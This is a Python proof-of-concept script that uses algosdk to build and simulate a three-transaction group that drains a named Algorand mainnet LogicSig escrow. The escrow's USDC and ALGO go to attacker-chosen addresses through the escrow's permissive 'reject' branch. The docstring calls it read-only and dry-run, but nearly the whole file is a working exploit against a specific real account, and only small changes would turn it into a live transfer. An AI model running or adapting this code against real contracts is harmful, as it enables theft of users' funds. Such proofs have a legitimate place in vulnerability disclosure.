"""Read-only proof: simulate (NOT broadcast) a permissionless drain of Vesta's
LGWHT7ED mortgage-escrow LogicSig account via its no-op 'reject' branch.

The escrow program is public on-chain; arg_0='reject' only asserts GroupSize==3
and returns true. A 3-tx group where the escrow sends its USDC (close-out) and
its ALGO (close-remainder) to attacker-chosen addresses must therefore be valid.
We verify by calling algod /v2/transactions/simulate (dry-run; no broadcast).
"""
import base64, json, sys
import requests
from algosdk import account, transaction
from algosdk.v2client.algod import AlgodClient
from algosdk.v2client import models

ALGOD = "https://mainnet-api.algonode.cloud"
IDX = "https://mainnet-idx.algonode.cloud"
ESCROW = "LGWHT7EDRGXQMRTLQDL54WKQU2FYRMNTGF6QXVDMZRCXHBUOLR3BSIJQBY"
USDC = 31566704
VST = 1135235829

client = AlgodClient("", ALGOD)
sp = client.suggested_params()
print("algod suggested round:", sp.first, "minfee:", sp.min_fee)

# program extracted from the escrow's own on-chain LogicSig signatures
program = open("escrow_LGWHT7EDRGXQ.bin", "rb").read()
lsig = transaction.LogicSigAccount(program, ["reject"])
print("lsig address:", lsig.address(), "match:", lsig.address() == ESCROW)

# attacker-chosen recipient: must already be opted into USDC (an attacker can opt in
# for 0.1 ALGO beforehand); we use an existing USDC-opted account for the dry run.
r = requests.get(f"{IDX}/v2/accounts/{ESCROW}", timeout=30).json()["account"]
print("escrow ALGO:", r["amount"], "assets:", [(a["asset-id"], a["amount"], a["is-frozen"]) for a in r["assets"]])
opt_in_recv = "FZHGJCVRUWSJ57CGKEGNZZ2GMP3VERDBNOQYVHHC3XYQ7WITCD2LGAKF4E"
chk = requests.get(f"{IDX}/v2/accounts/{opt_in_recv}", timeout=30).json()["account"]
print("recipient USDC holding:", [(a["asset-id"], a["amount"]) for a in chk.get("assets", []) if a["asset-id"] == USDC])

sk, fresh = account.generate_account()   # fresh attacker-controlled ALGO recipient
tx0 = transaction.AssetTransferTxn(sender=ESCROW, sp=sp, receiver=opt_in_recv, amt=0,
                                   index=USDC, close_assets_to=opt_in_recv)
# escrow min balance = 0.1 base + 0.1 USDC + 0.1 frozen VST = 0.3 ALGO.
# after tx0 closes the USDC opt-in, min = 0.2 ALGO; free = 323000 - 2000 fees - 200000 = 121000 uALGO.
tx1 = transaction.PaymentTxn(sender=ESCROW, sp=sp, receiver=fresh, amt=121000)
# filler tx (fee-pool): sender is any funded account; unsigned filler is fine for simulate.
filler = "I36BMZVLIUKQCKWNFHYQP2YODUMQRAWKHHSBN2NH57T2OIYAIQJAQJ5AHE"
tx2 = transaction.PaymentTxn(sender=filler, sp=sp, receiver=filler, amt=0)
for t in (tx0, tx1, tx2):
    t.fee = 1000  # escrow txs must be <= MinTxnFee (asserted by program); pool = 3 x 1000
transaction.assign_group_id([tx0, tx1, tx2])

stx0 = transaction.LogicSigTransaction(tx0, lsig)   # authorized by public LogicSig, arg 'reject'
stx1 = transaction.LogicSigTransaction(tx1, lsig)
stx2 = transaction.SignedTransaction(tx2, None)       # unsigned filler (allowed in simulate)
req = models.SimulateRequest(
    txn_groups=[models.SimulateRequestTransactionGroup(txns=[stx0, stx1, stx2])],
    allow_empty_signatures=True,
)
res = client.simulate_transactions(req)
out = {"escrow": ESCROW, "fresh_recipient": fresh, "opt_in_recipient": opt_in_recv,
       "group_size": 3, "arg": "reject", "simulate": res}
json.dump(out, open("simulate_drain_result.json", "w"), indent=1, default=str)
print(json.dumps(res, indent=1, default=str)[:3000])
